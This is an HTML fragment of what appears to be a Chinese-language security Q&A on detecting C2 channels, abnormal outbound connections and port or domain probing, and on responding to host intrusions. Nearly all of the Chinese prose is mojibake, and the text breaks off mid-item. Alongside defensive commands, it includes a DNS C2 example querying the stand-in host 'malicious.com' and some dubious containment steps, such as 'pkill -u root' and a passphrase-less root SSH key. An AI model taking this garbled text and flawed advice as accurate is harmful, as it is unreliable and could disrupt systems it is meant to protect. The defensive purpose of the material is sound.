id="ä¸åŒå±‚é¢çš„å¨èƒæ„ŸçŸ¥ï¼š1-ç½‘ç»œå±‚ï¼š-ç›‘æµ‹-å¼‚å¸¸ç«¯å£æ‰«æã€DDoS-æ”»å‡»ã€‚2-åº”ç”¨å±‚ï¼š-å‘ç°-SQL-æ³¨å…¥ã€XSSã€ä¸šåŠ¡æ»¥ç”¨ã€‚3-ç»ˆç«¯å±‚ï¼š-ç›‘æµ‹-æ¶æ„è½¯ä»¶ã€C2-è¿æ¥ã€‚4-ç”¨æˆ·è¡Œä¸ºå±‚ï¼š-é€šè¿‡-UEBA-æ£€æµ‹è´¦å·ç›—ç”¨ã€å¼‚å¸¸è®¿é—®ã€‚"><a href="#ä¸åŒå±‚é¢çš„å¨èƒæ„ŸçŸ¥ï¼š1-ç½‘ç»œå±‚ï¼š-ç›‘æµ‹-å¼‚å¸¸ç«¯å£æ‰«æã€DDoS-æ”»å‡»ã€‚2-åº”ç”¨å±‚ï¼š-å‘ç°-SQL-æ³¨å…¥ã€XSSã€ä¸šåŠ¡æ»¥ç”¨ã€‚3-ç»ˆç«¯å±‚ï¼š-ç›‘æµ‹-æ¶æ„è½¯ä»¶ã€C2-è¿æ¥ã€‚4-ç”¨æˆ·è¡Œä¸ºå±‚ï¼š-é€šè¿‡-UEBA-æ£€æµ‹è´¦å·ç›—ç”¨ã€å¼‚å¸¸è®¿é—®ã€‚" class="headerlink" title="ä¸åŒå±‚é¢çš„å¨èƒæ„ŸçŸ¥ï¼š1. ç½‘ç»œå±‚ï¼š   - ç›‘æµ‹ å¼‚å¸¸ç«¯å£æ‰«æã€DDoS æ”»å‡»ã€‚2. åº”ç”¨å±‚ï¼š   - å‘ç° SQL æ³¨å…¥ã€XSSã€ä¸šåŠ¡æ»¥ç”¨ã€‚3. ç»ˆç«¯å±‚ï¼š   - ç›‘æµ‹ æ¶æ„è½¯ä»¶ã€C2 è¿æ¥ã€‚4. ç”¨æˆ·è¡Œä¸ºå±‚ï¼š   - é€šè¿‡ UEBA æ£€æµ‹è´¦å·ç›—ç”¨ã€å¼‚å¸¸è®¿é—®ã€‚"></a><strong>ä¸åŒå±‚é¢çš„å¨èƒæ„ŸçŸ¥</strong>ï¼š<br>1. <strong>ç½‘ç»œå±‚</strong>ï¼š<br>   - ç›‘æµ‹ <strong>å¼‚å¸¸ç«¯å£æ‰«æã€DDoS æ”»å‡»</strong>ã€‚<br>2. <strong>åº”ç”¨å±‚</strong>ï¼š<br>   - å‘ç° <strong>SQL æ³¨å…¥ã€XSSã€ä¸šåŠ¡æ»¥ç”¨</strong>ã€‚<br>3. <strong>ç»ˆç«¯å±‚</strong>ï¼š<br>   - ç›‘æµ‹ <strong>æ¶æ„è½¯ä»¶ã€C2 è¿æ¥</strong>ã€‚<br>4. <strong>ç”¨æˆ·è¡Œä¸ºå±‚</strong>ï¼š<br>   - é€šè¿‡ <strong>UEBA</strong> æ£€æµ‹è´¦å·ç›—ç”¨ã€å¼‚å¸¸è®¿é—®ã€‚</h2><h3 id="TCP-åè®®çš„æµé‡è¦å­˜å‚¨å“ªäº›å…³é”®å­—æ®µï¼Ÿ"><a href="#TCP-åè®®çš„æµé‡è¦å­˜å‚¨å“ªäº›å…³é”®å­—æ®µï¼Ÿ" class="headerlink" title="TCP åè®®çš„æµé‡è¦å­˜å‚¨å“ªäº›å…³é”®å­—æ®µï¼Ÿ"></a><strong>TCP åè®®çš„æµé‡è¦å­˜å‚¨å“ªäº›å…³é”®å­—æ®µï¼Ÿ</strong></h3><h2 id="å…³é”®å­—æ®µï¼š1-æº-IP-ç›®æ ‡-IPï¼š-è¯†åˆ«æ”»å‡»æ¥æºã€‚2-æºç«¯å£-ç›®æ ‡ç«¯å£ï¼š-ç¡®å®šæœåŠ¡ç±»å‹ï¼ˆå¦‚-80-ä¸º-HTTPï¼‰ã€‚3-æ•°æ®åŒ…åºåˆ—å·ï¼ˆSEQï¼‰ï¼š-ç”¨äºæ£€æµ‹-TCP-é‡ä¼ ã€æµé‡é‡æ”¾ã€‚4-æµé‡æ–¹å‘ï¼ˆIN-OUTï¼‰ï¼š-ä¾¿äºåŒºåˆ†å‡ºç«™-å…¥ç«™æµé‡ã€‚"><a href="#å…³é”®å­—æ®µï¼š1-æº-IP-ç›®æ ‡-IPï¼š-è¯†åˆ«æ”»å‡»æ¥æºã€‚2-æºç«¯å£-ç›®æ ‡ç«¯å£ï¼š-ç¡®å®šæœåŠ¡ç±»å‹ï¼ˆå¦‚-80-ä¸º-HTTPï¼‰ã€‚3-æ•°æ®åŒ…åºåˆ—å·ï¼ˆSEQï¼‰ï¼š-ç”¨äºæ£€æµ‹-TCP-é‡ä¼ ã€æµé‡é‡æ”¾ã€‚4-æµé‡æ–¹å‘ï¼ˆIN-OUTï¼‰ï¼š-ä¾¿äºåŒºåˆ†å‡ºç«™-å…¥ç«™æµé‡ã€‚" class="headerlink" title="å…³é”®å­—æ®µï¼š1. æº IP&#x2F;ç›®æ ‡ IPï¼š   - è¯†åˆ«æ”»å‡»æ¥æºã€‚2. æºç«¯å£&#x2F;ç›®æ ‡ç«¯å£ï¼š   - ç¡®å®šæœåŠ¡ç±»å‹ï¼ˆå¦‚ 80 ä¸º HTTPï¼‰ã€‚3. æ•°æ®åŒ…åºåˆ—å·ï¼ˆSEQï¼‰ï¼š   - ç”¨äºæ£€æµ‹ TCP é‡ä¼ ã€æµé‡é‡æ”¾ã€‚4. æµé‡æ–¹å‘ï¼ˆIN&#x2F;OUTï¼‰ï¼š   - ä¾¿äºåŒºåˆ†å‡ºç«™&#x2F;å…¥ç«™æµé‡ã€‚"></a><strong>å…³é”®å­—æ®µ</strong>ï¼š<br>1. <strong>æº IP&#x2F;ç›®æ ‡ IP</strong>ï¼š<br>   - è¯†åˆ«æ”»å‡»æ¥æºã€‚<br>2. <strong>æºç«¯å£&#x2F;ç›®æ ‡ç«¯å£</strong>ï¼š<br>   - ç¡®å®šæœåŠ¡ç±»å‹ï¼ˆå¦‚ 80 ä¸º HTTPï¼‰ã€‚<br>3. <strong>æ•°æ®åŒ…åºåˆ—å·ï¼ˆSEQï¼‰</strong>ï¼š<br>   - ç”¨äºæ£€æµ‹ TCP é‡ä¼ ã€æµé‡é‡æ”¾ã€‚<br>4. <strong>æµé‡æ–¹å‘ï¼ˆIN&#x2F;OUTï¼‰</strong>ï¼š<br>   - ä¾¿äºåŒºåˆ†å‡ºç«™&#x2F;å…¥ç«™æµé‡ã€‚</h2><h3 id="å¦‚ä½•åœ¨æœåŠ¡å™¨ä¸ŠæŠ“å–-HTTPS-æµé‡è¿›è¡Œåˆ†æï¼Ÿ"><a href="#å¦‚ä½•åœ¨æœåŠ¡å™¨ä¸ŠæŠ“å–-HTTPS-æµé‡è¿›è¡Œåˆ†æï¼Ÿ" class="headerlink" title="å¦‚ä½•åœ¨æœåŠ¡å™¨ä¸ŠæŠ“å– HTTPS æµé‡è¿›è¡Œåˆ†æï¼Ÿ"></a><strong>å¦‚ä½•åœ¨æœåŠ¡å™¨ä¸ŠæŠ“å– HTTPS æµé‡è¿›è¡Œåˆ†æï¼Ÿ</strong></h3><p><strong>æ–¹æ³• 1ï¼šä½¿ç”¨ <code>tcpdump</code> æŠ“åŒ…</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 port 443 -w https_traffic.pcap</span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³• 2ï¼šä½¿ç”¨ Wireshark è§£å¯† HTTPS</strong></p><ol><li>åœ¨æµè§ˆå™¨è®¾ç½® <code>SSLKEYLOGFILE</code> ç¯å¢ƒå˜é‡ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SSLKEYLOGFILE=/tmp/sslkeys.log</span><br></pre></td></tr></table></figure></li><li>åœ¨ Wireshark åŠ è½½ <code>sslkeys.log</code> è¿›è¡Œæµé‡è§£å¯†ã€‚</li></ol><h2 id="æ–¹æ³•-3ï¼šä½¿ç”¨-mitmproxy-è¿›è¡Œ-HTTPS-ä»£ç†"><a href="#æ–¹æ³•-3ï¼šä½¿ç”¨-mitmproxy-è¿›è¡Œ-HTTPS-ä»£ç†" class="headerlink" title="æ–¹æ³• 3ï¼šä½¿ç”¨ mitmproxy è¿›è¡Œ HTTPS ä»£ç†"></a><strong>æ–¹æ³• 3ï¼šä½¿ç”¨ mitmproxy è¿›è¡Œ HTTPS ä»£ç†</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy -p 8080 --mode transparent</span><br></pre></td></tr></table></figure></h2><h3 id="å¸¸è§çš„-C-C-é€šé“ç§ç±»å’Œç‰¹å¾ï¼Ÿ"><a href="#å¸¸è§çš„-C-C-é€šé“ç§ç±»å’Œç‰¹å¾ï¼Ÿ" class="headerlink" title="å¸¸è§çš„ C&amp;C é€šé“ç§ç±»å’Œç‰¹å¾ï¼Ÿ"></a><strong>å¸¸è§çš„ C&amp;C é€šé“ç§ç±»å’Œç‰¹å¾ï¼Ÿ</strong></h3><p><strong>å¸¸è§ C&amp;Cï¼ˆCommand &amp; Controlï¼‰é€šé“ç±»å‹</strong>ï¼š</p><ol><li><strong>åŸºäº HTTP&#x2F;HTTPS</strong>ï¼š<ul><li>ä¼ªè£…æˆæ­£å¸¸ Web æµé‡ï¼ŒC2 æœåŠ¡å™¨éšè—åœ¨ CDN ä¹‹åã€‚</li></ul></li><li><strong>åŸºäº DNS</strong>ï¼š<ul><li>é€šè¿‡ DNS è§£ææ•°æ®ï¼Œå¦‚ <code>base64</code> ç¼–ç æ•°æ®å­˜å‚¨åœ¨ TXT è®°å½•ä¸­ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @malicious.com TXT</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>åŸºäº P2P</strong>ï¼š<ul><li>æ— éœ€ä¸­å¿ƒåŒ–æœåŠ¡å™¨ï¼Œå¦‚ Botnet ç½‘ç»œã€‚</li></ul></li><li><strong>åŸºäºç¤¾äº¤åª’ä½“</strong>ï¼š<ul><li>é€šè¿‡ Telegramã€Twitter ä¼ è¾“å‘½ä»¤ã€‚</li></ul></li></ol><p><strong>ç‰¹å¾åˆ†æ</strong>ï¼š</p><ul><li><strong>ä¸Šè¡Œæµé‡æ¯”ä¸‹è¡Œæµé‡å¤§</strong>ï¼ˆBot è®¾å¤‡å‘é€å¤§é‡æ•°æ®ï¼‰ã€‚</li><li><strong>é•¿è¿æ¥ä¿æŒ</strong>ï¼Œä¼šè¯æ—¶é—´è¾ƒé•¿ã€‚</li><li><strong>è¯·æ±‚å¿ƒè·³æœºåˆ¶</strong>ï¼Œå‘¨æœŸæ€§è®¿é—® C2 æœåŠ¡å™¨ã€‚</li><li><strong>å¼‚å¸¸èµ„æºå¼•ç”¨</strong>ï¼Œæ—  JS&#x2F;CSS ä½†é¢‘ç¹è®¿é—® URLã€‚</li></ul><hr><h3 id="å¦‚ä½•åœ¨åŠ å¯†æµé‡ä¸­æ£€æµ‹å‡ºæ¶æ„æµé‡ï¼Ÿ"><a href="#å¦‚ä½•åœ¨åŠ å¯†æµé‡ä¸­æ£€æµ‹å‡ºæ¶æ„æµé‡ï¼Ÿ" class="headerlink" title="å¦‚ä½•åœ¨åŠ å¯†æµé‡ä¸­æ£€æµ‹å‡ºæ¶æ„æµé‡ï¼Ÿ"></a><strong>å¦‚ä½•åœ¨åŠ å¯†æµé‡ä¸­æ£€æµ‹å‡ºæ¶æ„æµé‡ï¼Ÿ</strong></h3><p><strong>æ£€æµ‹æ–¹æ³•</strong>ï¼š</p><ol><li><strong>æµé‡æ¨¡å¼åˆ†æ</strong>ï¼š<ul><li>è¯†åˆ«å¼‚å¸¸é•¿è¿æ¥ã€å‘¨æœŸæ€§æ•°æ®åŒ…ç‰¹å¾ã€‚</li></ul></li><li><strong>JA3 æŒ‡çº¹è¯†åˆ«</strong>ï¼ˆTLS æŒ‡çº¹ï¼‰ï¼š<ul><li>é€šè¿‡ <code>JA3</code> æŒ‡çº¹åŒ¹é… C2 æœåŠ¡å™¨è¡Œä¸ºï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ja3 -r capture.pcap</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>SNI åˆ†æ</strong>ï¼š<ul><li>æ£€æŸ¥ SNI æ˜¯å¦è®¿é—®å¼‚å¸¸åŸŸåï¼Œå¦‚ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep SNI /var/log/ssl_access.log</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="å¦‚ä½•è¯†åˆ«å¼‚å¸¸æœåŠ¡å™¨å¤–è”ï¼Ÿ"><a href="#å¦‚ä½•è¯†åˆ«å¼‚å¸¸æœåŠ¡å™¨å¤–è”ï¼Ÿ" class="headerlink" title="å¦‚ä½•è¯†åˆ«å¼‚å¸¸æœåŠ¡å™¨å¤–è”ï¼Ÿ"></a><strong>å¦‚ä½•è¯†åˆ«å¼‚å¸¸æœåŠ¡å™¨å¤–è”ï¼Ÿ</strong></h3><p><strong>å¼‚å¸¸å¤–è”è¡Œä¸º</strong>ï¼š</p><ol><li><strong>çŸ­æ—¶é—´å†…è¿æ¥å¤šä¸ªå¯ç–‘ IP</strong>ï¼š<ul><li><code>netstat -an</code> å‘ç°å¤§é‡å‡ºç«™è¿æ¥ã€‚</li></ul></li><li><strong>è®¿é—®å†·é—¨åŸŸå</strong>ï¼š<ul><li>é€šè¿‡ <code>dnsmasq.log</code> å‘ç°éå¸¸è§åŸŸåè§£æï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;QUERY&quot;</span> /var/log/dnsmasq.log</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>åŠ å¯†æµé‡å¼‚å¸¸å¢å¤š</strong>ï¼š<ul><li><code>tcpdump</code> æŠ“åŒ…åˆ†æ TLS è¿æ¥æ•°é‡æ¿€å¢ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 port 443</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="åŸºäºç½‘ç»œäº”å…ƒç»„å¯ä»¥åšå“ªäº›é£é™©è¡Œä¸ºçš„åˆ†æï¼Ÿ"><a href="#åŸºäºç½‘ç»œäº”å…ƒç»„å¯ä»¥åšå“ªäº›é£é™©è¡Œä¸ºçš„åˆ†æï¼Ÿ" class="headerlink" title="åŸºäºç½‘ç»œäº”å…ƒç»„å¯ä»¥åšå“ªäº›é£é™©è¡Œä¸ºçš„åˆ†æï¼Ÿ"></a><strong>åŸºäºç½‘ç»œäº”å…ƒç»„å¯ä»¥åšå“ªäº›é£é™©è¡Œä¸ºçš„åˆ†æï¼Ÿ</strong></h3><p><strong>äº”å…ƒç»„ï¼ˆæº IPã€ç›®çš„ IPã€æºç«¯å£ã€ç›®çš„ç«¯å£ã€åè®®ï¼‰åˆ†æé£é™©</strong>ï¼š</p><ol><li><strong>ç«¯å£æ‰«ææ£€æµ‹</strong>ï¼š<ul><li>åŒä¸€ IP çŸ­æ—¶é—´è®¿é—®å¤šä¸ªç«¯å£ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;SYN&quot;</span> /var/log/firewall.log</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>æµé‡çªå˜</strong>ï¼š<ul><li>å‘ç°å¼‚å¸¸ä¸Šä¼ æµé‡ï¼ˆå¦‚æ•°æ®æ³„éœ²ï¼‰ã€‚</li></ul></li><li><strong>åè®®å¼‚å¸¸</strong>ï¼š<ul><li>HTTP ç«¯å£ä¼ è¾“é HTTP æ•°æ®ï¼Œå¯èƒ½æ˜¯éš§é“é€šä¿¡ã€‚</li></ul></li></ol><hr><h2 id="é£é™©è¯†åˆ«ä¸åº”å¯¹-ä¸»æœºä¾§"><a href="#é£é™©è¯†åˆ«ä¸åº”å¯¹-ä¸»æœºä¾§" class="headerlink" title="é£é™©è¯†åˆ«ä¸åº”å¯¹ - ä¸»æœºä¾§"></a><strong>é£é™©è¯†åˆ«ä¸åº”å¯¹ - ä¸»æœºä¾§</strong></h2><h3 id="ä¸»æœºæœ‰é‚£äº›æ—¥å¿—å¯¹é£é™©è¯†åˆ«æœ‰å¸®åŠ©ï¼Ÿ"><a href="#ä¸»æœºæœ‰é‚£äº›æ—¥å¿—å¯¹é£é™©è¯†åˆ«æœ‰å¸®åŠ©ï¼Ÿ" class="headerlink" title="ä¸»æœºæœ‰é‚£äº›æ—¥å¿—å¯¹é£é™©è¯†åˆ«æœ‰å¸®åŠ©ï¼Ÿ"></a><strong>ä¸»æœºæœ‰é‚£äº›æ—¥å¿—å¯¹é£é™©è¯†åˆ«æœ‰å¸®åŠ©ï¼Ÿ</strong></h3><p><strong>å…³é”®æ—¥å¿—</strong>ï¼š</p><ol><li>**<code>/var/log/auth.log</code>**ï¼š<ul><li>è®°å½• SSH ç™»å½•ï¼Œå‘ç°æš´åŠ›ç ´è§£æ”»å‡»ã€‚</li></ul></li><li>**<code>/var/log/syslog</code>**ï¼š<ul><li>è®°å½•ç³»ç»Ÿå¼‚å¸¸äº‹ä»¶ï¼Œå¦‚ root æƒé™ææƒã€‚</li></ul></li><li>**<code>/var/log/secure</code>**ï¼š<ul><li>è®°å½• sudo æ“ä½œï¼Œåˆ¤æ–­æ˜¯å¦æœ‰éæˆæƒææƒè¡Œä¸ºã€‚</li></ul></li></ol><hr><h3 id="æŠ½è±¡æ¥çœ‹ä¸»æœºä¸­æœ‰å“ªäº›æ—¥å¿—å¯å®ç°æ–¹å¼ï¼Ÿ"><a href="#æŠ½è±¡æ¥çœ‹ä¸»æœºä¸­æœ‰å“ªäº›æ—¥å¿—å¯å®ç°æ–¹å¼ï¼Ÿ" class="headerlink" title="æŠ½è±¡æ¥çœ‹ä¸»æœºä¸­æœ‰å“ªäº›æ—¥å¿—å¯å®ç°æ–¹å¼ï¼Ÿ"></a><strong>æŠ½è±¡æ¥çœ‹ä¸»æœºä¸­æœ‰å“ªäº›æ—¥å¿—å¯å®ç°æ–¹å¼ï¼Ÿ</strong></h3><p><strong>æ—¥å¿—ç±»å‹</strong>ï¼š</p><ol><li><strong>å®‰å…¨å®¡è®¡æ—¥å¿—</strong>ï¼š<ul><li>è®°å½•ç”¨æˆ·ç™»å½•ã€æƒé™å˜æ›´ï¼ˆå¦‚ <code>auth.log</code>ï¼‰ã€‚</li></ul></li><li><strong>ç³»ç»Ÿäº‹ä»¶æ—¥å¿—</strong>ï¼š<ul><li>è¿›ç¨‹å¯åŠ¨&#x2F;ç»ˆæ­¢ï¼ˆ<code>dmesg</code>ï¼‰ã€‚</li></ul></li><li><strong>ç½‘ç»œè¿æ¥æ—¥å¿—</strong>ï¼š<ul><li>è®°å½•å‡ºç«™&#x2F;å…¥ç«™æµé‡ï¼ˆ<code>iptables log</code>ï¼‰ã€‚</li></ul></li></ol><hr><h3 id="ä¸€ä¸ªé»‘å®¢å…¥ä¾µä¸»æœºåæ¤å…¥äº†ä¸€ä¸ªæœ¨é©¬ï¼Œå¹¶æ“¦é™¤äº†å„ç§æ—¥å¿—ï¼Œå¦‚ä½•æ‰¾å‡ºå…¶å¦‚ä½•å…¥ä¾µçš„ä»¥åŠå…¥ä¾µååšäº†ä»€ä¹ˆï¼Ÿ"><a href="#ä¸€ä¸ªé»‘å®¢å…¥ä¾µä¸»æœºåæ¤å…¥äº†ä¸€ä¸ªæœ¨é©¬ï¼Œå¹¶æ“¦é™¤äº†å„ç§æ—¥å¿—ï¼Œå¦‚ä½•æ‰¾å‡ºå…¶å¦‚ä½•å…¥ä¾µçš„ä»¥åŠå…¥ä¾µååšäº†ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸€ä¸ªé»‘å®¢å…¥ä¾µä¸»æœºåæ¤å…¥äº†ä¸€ä¸ªæœ¨é©¬ï¼Œå¹¶æ“¦é™¤äº†å„ç§æ—¥å¿—ï¼Œå¦‚ä½•æ‰¾å‡ºå…¶å¦‚ä½•å…¥ä¾µçš„ä»¥åŠå…¥ä¾µååšäº†ä»€ä¹ˆï¼Ÿ"></a><strong>ä¸€ä¸ªé»‘å®¢å…¥ä¾µä¸»æœºåæ¤å…¥äº†ä¸€ä¸ªæœ¨é©¬ï¼Œå¹¶æ“¦é™¤äº†å„ç§æ—¥å¿—ï¼Œå¦‚ä½•æ‰¾å‡ºå…¶å¦‚ä½•å…¥ä¾µçš„ä»¥åŠå…¥ä¾µååšäº†ä»€ä¹ˆï¼Ÿ</strong></h3><p><strong>æº¯æºæ–¹æ³•</strong>ï¼š</p><ol><li>**æ£€æŸ¥ <code>.bash_history</code>**ï¼š<ul><li>å¯èƒ½ç•™ä¸‹å‘½ä»¤ç—•è¿¹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.bash_history</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>æŸ¥çœ‹ <code>/proc</code> è¿›ç¨‹ä¿¡æ¯</strong>ï¼š<ul><li>è¿è¡Œ <code>ps aux</code>ï¼ŒæŸ¥æ‰¾éšè—è¿›ç¨‹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep suspicious</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>æ¢å¤æ—¥å¿—</strong>ï¼š<ul><li>ä½¿ç”¨ <code>extundelete</code> å°è¯•æ¢å¤è¢«åˆ é™¤çš„æ—¥å¿—ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extundelete /dev/sda1 --restore-all</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>æ£€æŸ¥æ–‡ä»¶å˜æ›´æ—¶é—´</strong>ï¼š<ul><li>é€šè¿‡ <code>ls -lt</code> ç¡®è®¤æœ€è¿‘ä¿®æ”¹çš„å¯ç–‘æ–‡ä»¶ã€‚</li></ul></li></ol><hr><h3 id="æŸä¸ªé»‘å®¢å…¥ä¾µä¸»æœºåï¼Œæ‹¿åˆ°äº†-root-æƒé™ï¼Œå¦‚ä½•æ­¢è¡€ï¼Ÿ"><a href="#æŸä¸ªé»‘å®¢å…¥ä¾µä¸»æœºåï¼Œæ‹¿åˆ°äº†-root-æƒé™ï¼Œå¦‚ä½•æ­¢è¡€ï¼Ÿ" class="headerlink" title="æŸä¸ªé»‘å®¢å…¥ä¾µä¸»æœºåï¼Œæ‹¿åˆ°äº† root æƒé™ï¼Œå¦‚ä½•æ­¢è¡€ï¼Ÿ"></a><strong>æŸä¸ªé»‘å®¢å…¥ä¾µä¸»æœºåï¼Œæ‹¿åˆ°äº† root æƒé™ï¼Œå¦‚ä½•æ­¢è¡€ï¼Ÿ</strong></h3><p><strong>ç´§æ€¥æ­¢è¡€æ–¹æ¡ˆ</strong>ï¼š</p><ol><li><strong>é™åˆ¶ root è®¿é—®</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd -l root</span><br></pre></td></tr></table></figure></li><li><strong>å¼ºåˆ¶è¸¢é™¤æ”»å‡»è€…ä¼šè¯</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkill -u root</span><br></pre></td></tr></table></figure></li><li><strong>å…³é—­ç½‘ç»œè®¿é—®</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 down</span><br></pre></td></tr></table></figure></li><li><strong>æ¢å¤å®‰å…¨ç­–ç•¥</strong>ï¼š<ul><li>é‡æ–°éƒ¨ç½² <code>iptables</code> è§„åˆ™ã€‚</li></ul></li></ol><hr><h3 id="æ„ŸçŸ¥åˆ°é»‘å®¢å…¥ä¾µäº†æ‰€æœ‰æœåŠ¡å™¨ï¼Œæ€ä¹ˆåŠï¼Ÿ"><a href="#æ„ŸçŸ¥åˆ°é»‘å®¢å…¥ä¾µäº†æ‰€æœ‰æœåŠ¡å™¨ï¼Œæ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="æ„ŸçŸ¥åˆ°é»‘å®¢å…¥ä¾µäº†æ‰€æœ‰æœåŠ¡å™¨ï¼Œæ€ä¹ˆåŠï¼Ÿ"></a><strong>æ„ŸçŸ¥åˆ°é»‘å®¢å…¥ä¾µäº†æ‰€æœ‰æœåŠ¡å™¨ï¼Œæ€ä¹ˆåŠï¼Ÿ</strong></h3><p><strong>ç´§æ€¥å“åº”æ­¥éª¤</strong>ï¼š</p><ol><li><strong>éš”ç¦»å—æ„ŸæŸ“æœåŠ¡å™¨</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s attacker_ip -j DROP</span><br></pre></td></tr></table></figure></li><li><strong>åˆ†ææ¶æ„è½¯ä»¶</strong>ï¼š<ul><li>æå–æ¶æ„è¿›ç¨‹çš„ <code>hash</code> è¿›è¡Œæº¯æºï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sha256sum</span> /tmp/malware</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>é‡ç½®æ‰€æœ‰å‡­æ®</strong>ï¼š<ul><li>é‡æ–°ç”Ÿæˆ <code>SSH</code> å¯†é’¥ï¼Œå¹¶ä¿®æ”¹ root å¯†ç ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f /root/.ssh/id_rsa -N <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>æ£€æŸ¥æŒä¹…åŒ–åé—¨</strong>ï¼š<ul><li>æ£€æŸ¥ <code>crontab</code> æ˜¯å¦è¢«ç¯¡æ”¹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>å…¨ç½‘å¨èƒç‹©çŒ</strong>ï¼š<ul><li>æ‰«ææ‰€æœ‰æœåŠ¡å™¨ï¼ŒæŸ¥æ‰¾ç›¸åŒæ¶æ„è¿›ç¨‹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep malware</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="å¦‚ä½•å‡†ç¡®è¯†åˆ«åŸŸåæ¢æµ‹ï¼Ÿ"><a href="#å¦‚ä½•å‡†ç¡®è¯†åˆ«åŸŸåæ¢æµ‹ï¼Ÿ" class="headerlink" title="å¦‚ä½•å‡†ç¡®è¯†åˆ«åŸŸåæ¢æµ‹ï¼Ÿ"></a><strong>å¦‚ä½•å‡†ç¡®è¯†åˆ«åŸŸåæ¢æµ‹ï¼Ÿ</strong></h3><p><strong>æ¢æµ‹ç‰¹å¾</strong>ï¼š</p><ul><li>è§£æå¤§é‡ä¸å­˜åœ¨çš„å­åŸŸï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep NXDOMAIN /var/log/dnsmasq.log</span><br></pre></td></tr></table></figure></li><li>è®¿é—®ç‰¹å®šå®‰å…¨æœºåˆ¶ï¼Œå¦‚ <code>.well-known/security.txt</code>ã€‚</li></ul><p><strong>é˜²å¾¡æ–¹æ³•</strong>ï¼š</p><ul><li>å¯ç”¨ <strong>DNS é€Ÿç‡é™åˆ¶</strong>ï¼Œé˜²æ­¢å¤§è§„æ¨¡å­åŸŸæšä¸¾ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p udp --dport 53 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 10/s -j ACCEPT</span><br></pre></td></tr></table></figure></li><li>ç›‘æ§ DNS æŸ¥è¯¢æ—¥å¿—ï¼Œå‘ç°å¼‚å¸¸åŸŸåè§£æè¡Œä¸ºã€‚</li></ul><hr><h3 id="å¦‚ä½•å‡†ç¡®è¯†åˆ«ç«¯å£æ¢æµ‹ï¼Ÿ"><a href="#å¦‚ä½•å‡†ç¡®è¯†åˆ«ç«¯å£æ¢æµ‹ï¼Ÿ" class="headerlink" title="å¦‚ä½•å‡†ç¡®è¯†åˆ«ç«¯å£æ¢æµ‹ï¼Ÿ"></a><strong>å¦‚ä½•å‡†ç¡®è¯†åˆ«ç«¯å£æ¢æµ‹ï¼Ÿ</strong></h3><p><strong>ç«¯å£æ¢æµ‹ç‰¹å¾</strong>ï¼š</p><ol><li><strong>å•ä¸ª IP è®¿é—®å¤šä¸ªç«¯å£</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;SYN&quot;</span> /var/log/firewall.log 